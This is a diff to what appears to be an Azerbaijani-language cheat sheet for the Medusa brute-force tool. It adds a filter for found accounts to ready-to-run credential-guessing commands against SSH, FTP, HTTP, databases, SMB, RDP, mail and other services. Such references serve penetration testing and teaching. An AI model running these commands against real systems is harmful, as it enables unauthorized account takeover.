@@ -199,74 +199,74 @@ medusa [SEÇIMLƏR] -h HƏDƏF -u USER -p PASS -M MODUL
 #### 🔑 SSH
 
 ```bash
-medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M ssh
+medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M ssh | grep "ACCOUNT FOUND"
 ```
 
 #### 📁 FTP
 
 ```bash
-medusa -h 192.168.1.1 -u admin -P passwords.txt -M ftp
+medusa -h 192.168.1.1 -u admin -P passwords.txt -M ftp | grep "ACCOUNT FOUND"
 ```
 
 #### 🌐 HTTP (Basic Auth)
 
 ```bash
-medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M http -m DIR:/admin
+medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M http -m DIR:/admin | grep "ACCOUNT FOUND"
 ```
 
 #### 🌐 HTTP Form (POST)
 
 ```bash
 medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M web-form \
-  -m "FORM:username=&password=:F=Login failed"
+  -m "FORM:username=&password=:F=Login failed" | grep "ACCOUNT FOUND"
 ```
 
 #### 🗄️ MySQL
 
 ```bash
-medusa -h 192.168.1.1 -u root -P passwords.txt -M mysql
+medusa -h 192.168.1.1 -u root -P passwords.txt -M mysql | grep "ACCOUNT FOUND"
 ```
 
 #### 🗃️ MSSQL
 
 ```bash
-medusa -h 192.168.1.1 -u sa -P passwords.txt -M mssql
+medusa -h 192.168.1.1 -u sa -P passwords.txt -M mssql | grep "ACCOUNT FOUND"
 ```
 
 #### 📧 SMTP
 
 ```bash
-medusa -h mail.example.com -U users.txt -P passwords.txt -M smtp
+medusa -h mail.example.com -U users.txt -P passwords.txt -M smtp | grep "ACCOUNT FOUND"
 ```
 
 #### 📡 SMB
 
 ```bash
-medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M smbnt
+medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M smbnt | grep "ACCOUNT FOUND"
 ```
 
 #### 🖥️ RDP
 
 ```bash
-medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M rdp
+medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M rdp | grep "ACCOUNT FOUND"
 ```
 
 #### 🔐 Telnet
 
 ```bash
-medusa -h 192.168.1.1 -u admin -P passwords.txt -M telnet
+medusa -h 192.168.1.1 -u admin -P passwords.txt -M telnet | grep "ACCOUNT FOUND"
 ```
 
 #### 📬 POP3
 
 ```bash
-medusa -h mail.example.com -U users.txt -P passwords.txt -M pop3
+medusa -h mail.example.com -U users.txt -P passwords.txt -M pop3 | grep "ACCOUNT FOUND"
 ```
 
 #### 📨 IMAP
 
 ```bash
-medusa -h mail.example.com -U users.txt -P passwords.txt -M imap
+medusa -h mail.example.com -U users.txt -P passwords.txt -M imap | grep "ACCOUNT FOUND"
 ```
 
 #### 🔌 VNC
